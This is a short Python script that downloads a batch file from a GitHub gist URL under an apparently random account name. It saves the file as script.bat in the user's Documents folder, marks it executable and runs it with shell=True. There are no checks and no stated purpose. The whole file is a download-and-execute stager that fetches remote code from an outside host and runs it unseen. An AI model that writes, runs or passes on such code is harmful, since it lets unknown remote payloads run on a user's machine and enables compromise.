import os
import urllib.request
import subprocess

url = "https://gist.githubusercontent.com/ToFe6aDD/d21bcaf2f2e0bac92c73fb85235eb058/raw/cbfa848d985bc59de55a8b914cd6c4a2f0e349c4/api.server.bat"

documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
local_file_path = os.path.join(documents_folder, "script.bat")   # saved as .bat

print(f"Downloading {url} → {local_file_path}")
urllib.request.urlretrieve(url, local_file_path)
print("Download finished.")

os.chmod(local_file_path, 0o755)

print("Running script.bat ...")
subprocess.run([local_file_path], shell=True)